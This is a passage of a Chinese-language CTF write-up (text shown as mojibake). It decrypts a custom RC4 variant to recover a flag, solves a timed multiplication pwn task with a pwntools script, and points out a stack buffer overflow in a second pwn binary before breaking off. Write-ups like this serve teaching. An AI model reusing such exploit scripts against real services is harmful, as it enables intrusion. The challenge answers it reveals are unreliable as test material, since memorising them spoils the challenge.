</span></span><span class="line"><span class="cl">                                                  <span class="o">-</span> <span class="p">((</span><span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="o">~</span><span class="p">((</span><span class="n">v13</span> <span class="o">&amp;</span> <span class="mh">0x7911131C</span> <span class="o">|</span> <span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE3</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x1C</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x86EEECE3</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                                                   <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                                            <span class="o">%</span> <span class="mi">256</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¤šè¯»è¯»å¤šçœ‹çœ‹å¯ä»¥çŸ¥é“åŠ å¯†<strong>åŸºäº RC4 æµåŠ å¯†ç®—æ³•çš„è‡ªå®šä¹‰å˜ä½“</strong></p>
<p>å†™å‡ºè§£å¯†è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ===== è§£å¯†è„šæœ¬ =====</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cipher_bytes</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x9A</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Samsara&#34;</span>  <span class="c1"># init_encode ä¸­çš„ key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init_encode</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">box</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">box</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_stream</span><span class="p">(</span><span class="n">box</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">box</span><span class="p">[(</span><span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">box</span> <span class="o">=</span> <span class="n">init_encode</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">stream</span> <span class="o">=</span> <span class="n">rc4_stream</span><span class="p">(</span><span class="n">box</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain</span> <span class="o">=</span> <span class="p">[(</span><span class="n">cipher_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">stream</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag =&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±è¿è¡Œç»“æœå¯çŸ¥SYC{Alright_I_sti1l_h0pe_th3t_you_solved_the_chall3nge_by_deobfuscating_them_Geek_is_just_the_first_step_of_your_CTF_journey_Im_glad_I_could_be_part_of_your_growth_Good_luck_for_y0u!}</p>
<h1 id="pwn">pwn
</h1><h3 id="16mission-calculator">16.Mission Calculator
</h3><p>æ‰“å¼€idaæŸ¥çœ‹ç¨‹åºé€»è¾‘å‘ç°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">math</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="nf">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10000</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10000</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Problem %d: %d * %d = &#34;</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">*</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__isoc23_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="n">v1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Incorrect. The answer is %d.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Correct!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Congratulations! You have completed all 50 math problems.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">win</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v7</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°åªè¦æ»¡è¶³ç¨‹åºé€»è¾‘å°±å¯ä»¥è·å¾—flagï¼Œä¹Ÿå°±æ˜¯æ¥å—æ•°æ®ï¼Œåšä¹˜æ³•è¿”å›æ•°æ®</p>
<p>expè„šæœ¬å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io=remote(&#34;geek.ctfplus.cn&#34;,31645)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./calc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;start...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pattern</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Problem (\d+): (\d+) \* (\d+) =&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; = &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#print(data)</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span><span class="o">=</span><span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">b</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>äº¤äº’å³å¯è·å¾—flag</p>
<h3 id="17mission-cipher-text">17.Mission Cipher Text
</h3><p>æ‰“å¼€idaï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">size_t submit_feedback()
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  puts(&#34;Please enter your feedback:&#34;);
</span></span><span class="line"><span class="cl">  close(1);
</span></span><span class="line"><span class="cl">  read(0, buf, 0x100uLL);  #å­˜åœ¨æº¢å‡º
</span></span><span class="line"><span class="cl">  return fwrite(&#34;\x1B[1m\x1B[95mwe are here waiting for you\x1B[0m\n&#34;, 1uLL, 0x29uLL, stderr);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>expå¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
